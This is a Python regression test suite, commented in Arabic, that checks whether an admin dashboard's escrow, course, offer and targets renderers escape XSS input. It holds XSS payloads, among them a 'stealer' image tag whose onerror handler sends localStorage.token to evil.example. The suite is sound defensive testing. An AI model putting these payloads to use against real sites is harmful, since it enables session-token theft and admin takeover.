# -*- coding: utf-8 -*-
"""الجولة الثانية من مصارف الـHTML الخام في لوحة التحكّم — F-135 · F-142 · F-144 · F-146.

Run:  cd backend && python3 -m pytest -q tests/test_xss_sinks_round2.py

لماذا ملفّ ثانٍ بدل توسيع الأول فقط: الأول يثبّت مصارف الرسائل والأهداف؛ هذا يشغّل
**الدوالّ المشحونة نفسها** للمصارف التي تركها إصلاح `F-093` وراءه:

  F-135  درج الدورة  (`drawCourse` فرع `c`) — `c.title` و`c.inst`، ودورُ «موظّف» يكتبهما
         عبر `POST /api/courses` ⇒ سلسلة «موظّف ⇒ أدمن».
  F-142  شاشة عروض الأسعار (`renderCourses` صفّ القائمة + `drawCourse` فرع `o`) —
         `o.course` · `o.buyer` · `o.segment` · `o.currency` من جسر المنصّة.
  F-144  شاشة الضمان (`renderEsc` + `drawEsc`) — الكاتب **سرّ الجسر** لا الأدمن.
  F-146  شاشة الأهداف (`viewTargets` بارات الشهور + `targetModal` داخل سمة `value="…"`).

الحمولتان: وسمٌ يشتغل بلا تفاعل، وحمولةُ **كسر سمة** لا وسم فيها أصلًا (فحصُ «هل يوجد
`<img>`؟» وحده كان سيمرّ عليها).
"""
import json
import os
import shutil
import subprocess
import tempfile
from html.parser import HTMLParser

import pytest

DASHBOARD_HTML = os.path.join(
    os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))),
    'dashboard-cloud', 'index.html',
)

PAYLOAD = '<img src=x onerror=alert(1)>'
STEALER = '<img src=x onerror="fetch(\'https://evil.example/?t=\'+localStorage.token)">'
ATTR_BREAK = '" autofocus onfocus=alert(1) x="'


# ---------------------------------------------------------------- helpers (نسخة الأول)

def _extract_function(src, name):
    """يرفع `function <name>(...) { … }` حرفيًّا من index.html، بمطابقة أقواسٍ واعيةٍ
    بالنصوص (فقوسٌ داخل سلسلةٍ مقتبسة لا يُنهي الدالّة مبكّرًا)."""
    start = src.index('function %s(' % name)
    i = src.index('{', start)
    depth, quote, esc_next = 0, None, False
    while i < len(src):
        c = src[i]
        if esc_next:
            esc_next = False
        elif quote:
            if c == '\\':
                esc_next = True
            elif c == quote:
                quote = None
        elif c in '\'"`':
            quote = c
        elif c == '{':
            depth += 1
        elif c == '}':
            depth -= 1
            if depth == 0:
                return src[start:i + 1]
        i += 1
    raise AssertionError('unterminated function %s' % name)


def _line_containing(src, needle):
    for line in src.split('\n'):
        if needle in line:
            return line
    raise AssertionError('line not found: %r' % needle)


class _AttrCollector(HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.tags = []
        self.attrs = []
        self.elements = []

    def handle_starttag(self, tag, attrs):
        self.tags.append(tag)
        self.attrs.extend(a for a, _ in attrs)
        self.elements.append((tag, dict(attrs)))

    handle_startendtag = handle_starttag


def _assert_inert(where, html):
    """النصّ ظهر مهرَّبًا، ولم يُولَد وسمٌ ولا سمة `on*` ولا `autofocus`."""
    assert html, 'no output from %s' % where
    assert '&lt;img' in html or '&quot;' in html, (where, html[:400])
    assert '<img' not in html.lower(), (where, html[:400])
    p = _AttrCollector()
    p.feed(html)
    assert 'img' not in p.tags, (where, p.tags)
    assert 'script' not in p.tags, (where, p.tags)
    on_attrs = [a for a in p.attrs if a.lower().startswith('on')]
    assert on_attrs == [], (where, on_attrs, html[:400])
    assert 'autofocus' not in p.attrs, (where, p.attrs, html[:400])
    return p


def _run_node(harness, name):
    tmp = os.path.join(tempfile.mkdtemp(), name)
    with open(tmp, 'w', encoding='utf-8') as fh:
        fh.write(harness)
    proc = subprocess.run([shutil.which('node'), tmp], capture_output=True, text=True)
    assert proc.returncode == 0, proc.stderr
    return json.loads(proc.stdout)


_DOM = r"""
var NODES = {};
function mkEl() {
  return { innerHTML: '', textContent: '',
           insertAdjacentHTML: function (pos, h) { this.innerHTML += h; },
           querySelectorAll: function () { return []; },
           querySelector: function () { return { onclick: null, value: '', dataset: {} }; },
           style: {} };
}
globalThis.document = { getElementById: function (id) { return (NODES[id] = NODES[id] || mkEl()); } };
globalThis.window = globalThis.window || {};   // الدوالّ تفحص `window.EP` قبل أي شيء حيّ
function svg() { return '<span class="i"></span>'; }
function timeAgo() { return 'الآن'; }
function notify() {} function toast() {} function closeModal() {}
"""


# ---------------------------------------------------------------- F-144 · الضمان

@pytest.mark.skipif(shutil.which('node') is None, reason='node is required to run the shipped renderers')
def test_shipped_escrow_renderers_escape_bridge_written_names():
    """`renderEsc` و`drawEsc` كما تُشحنان: الأسماء والأسباب يكتبها **سرّ الجسر**
    (`POST /api/escrow/hold` · `metrics/finance-event`) ويقرأها الأدمن."""
    src = open(DASHBOARD_HTML, encoding='utf-8').read()
    fns = '\n'.join([_line_containing(src, 'function esc(s){'),
                     _line_containing(src, 'const money='),
                     _line_containing(src, 'const STATUS={held:'),
                     _line_containing(src, 'const COMMISSION=')]
                    + [_extract_function(src, n) for n in ('renderEsc', 'drawEsc')])

    harness = _DOM + r"""
__FNS__
var P = __PAYLOAD__;
var SES = [{ id: P.plain, student: P.stealer, expert: P.plain, amount: 500, held: P.plain,
             release: P.plain, status: 'held', commission: 75, net: 425 }];
var DSP = [{ id: P.plain, session: P.plain, party: P.stealer, expert: P.plain, reason: P.body,
             amount: 100, opened: P.plain, sla: P.plain }];
var REL = [{ id: P.plain, expert: P.stealer, amount: 300, when: P.plain, commission: 45, net: 255 }];
function escSessions() { return SES; }
function escDisputes() { return DSP; }
function escReleased() { return REL; }

var escTab = 'sessions', selected = null;
renderEsc();                 var rowsSessions = NODES['escRows'].innerHTML;
escTab = 'disputes'; renderEsc(); var rowsDisputes = NODES['escRows'].innerHTML;
escTab = 'released'; renderEsc(); var rowsReleased = NODES['escRows'].innerHTML;
selected = 0; drawEsc();     var drawerSession = NODES['drawer'].innerHTML;
NODES['drawer'].innerHTML = '';
selected = 'd0'; drawEsc();  var drawerDispute = NODES['drawer'].innerHTML;

console.log(JSON.stringify({ rowsSessions: rowsSessions, rowsDisputes: rowsDisputes,
                             rowsReleased: rowsReleased, drawerSession: drawerSession,
                             drawerDispute: drawerDispute }));
"""
    harness = (harness.replace('__FNS__', fns)
               .replace('__PAYLOAD__', json.dumps({'plain': PAYLOAD, 'stealer': STEALER,
                                                   'body': '<svg onload=alert(1)>'})))
    out = _run_node(harness, 'escrow.js')
    for where, html in out.items():
        _assert_inert(where, html)
    # سبب الشكوى تحديدًا — الحقل الحرّ الذي يكتبه الجسر
    assert '&lt;svg onload=alert(1)&gt;' in out['drawerDispute'], out['drawerDispute'][:400]


# ---------------------------------------------------------------- F-135 + F-142 · الدورات

@pytest.mark.skipif(shutil.which('node') is None, reason='node is required to run the shipped renderers')
def test_shipped_course_drawer_escapes_title_and_instructor():
    """F-135: `drawCourse` فرع `c` — `c.title` و`c.inst` يكتبهما دور «موظّف» عبر
    `POST /api/courses` بلا تنقية، ويُقرآن بجلسة الأدمن. وفرع `o` (F-142) من الجسر."""
    src = open(DASHBOARD_HTML, encoding='utf-8').read()
    fns = '\n'.join([_line_containing(src, 'function esc(s){'),
                     _line_containing(src, 'const money='),
                     _line_containing(src, 'const CSTATUS={published:'),
                     _line_containing(src, 'const SEG_LABEL={individual:')]
                    + [_extract_function(src, 'drawCourse')])

    harness = _DOM + r"""
__FNS__
var P = __PAYLOAD__;
var COURSES = [{ id: 1, title: P.stealer, inst: P.plain, enrolled: P.plain, price: 'مدفوعة',
                 from: P.plain, status: 'published', on_platform: false, owner: 'platform', rate: 0 }];
var OFFERS = [{ id: 1, course: P.stealer, buyer: P.plain, segment: P.plain, currency: P.plain,
                list: 100, floor: 50, offered: 60, reason: P.body, higher: false }];
function csCourses() { return COURSES; }
function csOffers() { return OFFERS; }
function csPrograms() { return []; }
function csTrainers() { return []; }
function csSchedules() { return []; }
function csPlatformCourses() { return []; }

var selected = 'c0'; drawCourse(); var courseDrawer = NODES['drawer'].innerHTML;
NODES['drawer'].innerHTML = '';
selected = 'o0'; drawCourse(); var offerDrawer = NODES['drawer'].innerHTML;

console.log(JSON.stringify({ courseDrawer: courseDrawer, offerDrawer: offerDrawer }));
"""
    harness = (harness.replace('__FNS__', fns)
               .replace('__PAYLOAD__', json.dumps({'plain': PAYLOAD, 'stealer': STEALER,
                                                   'body': '<svg onload=alert(1)>'})))
    out = _run_node(harness, 'courses.js')
    for where, html in out.items():
        _assert_inert(where, html)
    # العنوان والمحاضر ما زالا يُعرَضان — نصًّا مهرَّبًا لا وسمًا
    assert '&lt;img src=x onerror=' in out['courseDrawer'], out['courseDrawer'][:400]


# ---------------------------------------------------------------- F-146 · الأهداف

@pytest.mark.skipif(shutil.which('node') is None, reason='node is required to run the shipped renderers')
def test_shipped_targets_screen_escapes_the_month_label():
    """F-146: تسمية الشهر في البارات (`t.m` ⇐ `/api/dashboard`)، وحقل الشهر داخل
    `value="…"` في `targetModal` — حمولة كسر السمة لا وسم فيها أصلًا."""
    src = open(DASHBOARD_HTML, encoding='utf-8').read()
    fns = '\n'.join([_line_containing(src, 'function esc(s){'),
                     _line_containing(src, 'const money='),
                     _line_containing(src, 'const TARGETS=[]'),
                     _line_containing(src, 'const GOALS=[]'),
                     _line_containing(src, 'const GSTAT={on:'),
                     _line_containing(src, 'function tgBars()'),
                     _line_containing(src, 'function tgGoals()')]
                    + [_extract_function(src, n)
                       for n in ('viewTargets', 'renderGoals', 'renderGoalsAdvisor', 'targetModal')])

    harness = _DOM + r"""
__FNS__
var P = __PAYLOAD__;
globalThis.window = { EP: { ensure: function () {}, reload: function () {},
                            state: { targets: 'ready', goalsAdvisor: 'idle' },
                            data: { targets: { bars: [{ m: P.plain, actual: 3, target: 5 }],
                                               goals: [], quarterPct: 60 } } } };
globalThis.EP = window.EP;
var v = mkEl();
viewTargets(v);
var barsHtml = v.innerHTML;

// نافذة تعديل الشهر: ميّتة اليوم (TARGETS فارغة) — تُحيا هنا عمدًا كي لا يعود المصرف
// صامتًا لو أُعيد وصلها لاحقًا.
TARGETS.push({ m: P.attr, actual: 1, target: 2 });
var modalBody = '';
function openModal(t, body) {
  modalBody = body;
  return { querySelector: function () { return { onclick: null, value: '', dataset: {} }; } };
}
targetModal(0);

console.log(JSON.stringify({ bars: barsHtml, modal: modalBody }));
"""
    harness = (harness.replace('__FNS__', fns)
               .replace('__PAYLOAD__', json.dumps({'plain': PAYLOAD, 'attr': ATTR_BREAK})))
    out = _run_node(harness, 'targets.js')
    for where, html in out.items():
        _assert_inert(where, html)
    # حقل الشهر يحمل الحمولة **كاملة** داخل سمة واحدة — مهرَّبة، لا مقطوعة عند علامة الاقتباس
    p = _AttrCollector()
    p.feed(out['modal'])
    inputs = {a.get('id'): a for tag, a in p.elements if tag == 'input'}
    assert 'tg_m' in inputs, sorted(inputs)
    assert inputs['tg_m']['value'] == ATTR_BREAK, inputs['tg_m']
    assert set(inputs['tg_m']) == {'id', 'value', 'placeholder'}, inputs['tg_m']


# ---------------------------------------------------------------- حارس grep (الاتجاهان)

RAW_SINKS_ROUND2 = [
    # F-144 — الضمان
    '${e.student}', '${e.expert}', '${d.reason}', '${r.expert}', '${d.party}',
    "${d.expert||''}", '${d.sla}', '${e.release}',
    # F-142 — عروض الأسعار
    '${o.course}', '${o.buyer}', '${SEG_LABEL[o.segment]||o.segment}', '${o.currency}',
    # F-135 — درج الدورة
    '${c.title}', '${c.inst}', '${c.enrolled}', '${c.from}',
    # F-146 — الأهداف
    '${t.m}', 'value="\'+(e.m||\'\')+\'"',
]

ESCAPED_FORMS_ROUND2 = [
    '${esc(e.student)}', '${esc(e.expert)}', '${esc(d.reason)}', '${esc(r.expert)}',
    '${esc(d.party)}', "${esc(d.expert||'')}", '${esc(d.sla)}', '${esc(e.release)}',
    '${esc(o.course)}', '${esc(o.buyer)}', '${SEG_LABEL[o.segment]||esc(o.segment)}',
    '${esc(o.currency)}',
    '${esc(c.title)}', '${esc(c.inst)}', '${esc(c.enrolled)}', '${esc(c.from)}',
    '${esc(t.m)}', 'value="\'+esc(e.m||\'\')+\'"',
]


def test_round2_sinks_have_no_raw_form_left():
    """تعديلٌ من سطرٍ واحد يقدر يشيل `esc()` بلا أن يحمرّ أي تست وحدة — إلا هذا."""
    src = open(DASHBOARD_HTML, encoding='utf-8').read()
    offenders = {p: src.count(p) for p in RAW_SINKS_ROUND2 if p in src}
    assert offenders == {}, offenders


def test_round2_sinks_ship_in_their_escaped_form():
    """المرآة: لا يكفي غيابُ الخام — يجب أن يكون المهرَّب هو **المشحون** فعلًا
    (فخّ «مكتوبٌ ولا يُرسَم» معكوسًا)."""
    src = open(DASHBOARD_HTML, encoding='utf-8').read()
    for needle in ESCAPED_FORMS_ROUND2:
        assert needle in src, needle
